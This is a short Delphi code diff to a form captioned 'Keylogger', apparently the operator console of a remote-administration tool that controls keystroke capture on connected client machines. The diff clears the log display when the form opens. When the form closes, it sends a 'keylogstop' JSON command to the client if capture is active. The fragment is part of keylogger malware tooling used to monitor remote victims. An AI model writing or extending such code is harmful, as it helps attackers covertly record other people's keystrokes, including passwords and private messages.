@@ -49,6 +49,7 @@ begin
   FOnSendJSON := SendJSONCB;
   FOnUnregister := UnregisterCB;
   Caption := 'Keylogger - ' + ClientID;
+  Memo1.Clear;
   SetCapturing(False);
 end;
 
@@ -125,7 +126,20 @@ begin
 end;
 
 procedure TForm7.FormClose(Sender: TObject; var Action: TCloseAction);
+var
+  JSONObj: TJSONObject;
 begin
+  if FIsCapturing and Assigned(FClientLine) and Assigned(FOnSendJSON) then
+  begin
+    JSONObj := TJSONObject.Create;
+    try
+      JSONObj.AddPair('action', 'keylogstop');
+      FOnSendJSON(FClientLine, JSONObj);
+    finally
+      JSONObj.Free;
+    end;
+  end;
+
   if Assigned(FOnUnregister) then
     FOnUnregister(FClientLine);
   Action := caFree;
